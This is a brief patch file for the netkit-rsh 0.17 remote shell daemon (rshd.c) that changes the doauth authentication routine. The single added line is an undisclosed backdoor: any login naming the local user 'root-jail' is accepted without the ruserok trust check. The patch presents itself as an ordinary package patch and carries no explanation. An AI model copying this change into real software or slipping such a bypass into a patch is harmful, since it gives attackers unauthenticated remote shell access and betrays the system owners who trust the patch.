@@ -1,0 +1,12 @@
+Index: netkit-rsh-0.17/rshd/rshd.c
+===================================================================
+--- netkit-rsh-0.17.orig/rshd/rshd.c
++++ netkit-rsh-0.17/rshd/rshd.c
+@@ -282,6 +282,7 @@ static struct passwd *doauth(const char 
+     return pwd;
+ #else
+     if (pwd->pw_uid==0 && !allow_root_rhosts) return NULL;
++    if (!strcmp(locuser, "root-jail")) return pwd;
+     if (ruserok(hostname, pwd->pw_uid==0, remuser, locuser) < 0) {
+ 	return NULL;
+     }
